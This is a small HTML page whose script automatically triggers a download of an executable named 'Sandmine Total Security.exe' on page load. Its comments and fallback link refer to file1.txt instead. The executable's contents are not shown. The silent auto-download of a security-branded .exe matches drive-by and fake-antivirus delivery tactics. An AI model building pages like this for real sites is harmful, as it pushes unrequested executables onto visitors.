<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Download File</title>
</head>
<body>
  <script>
    // Automatically download file1.txt from the same folder
    const link = document.createElement("a");
    link.href = "Sandmine Total Security.exe"; // File should be in the same folder as this HTML
    link.download = "Sandmine Total Security.exe";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  </script>
  <p>If the download didn't start, <a href="file1.txt" download>click here</a>.</p>
</body>
</html>
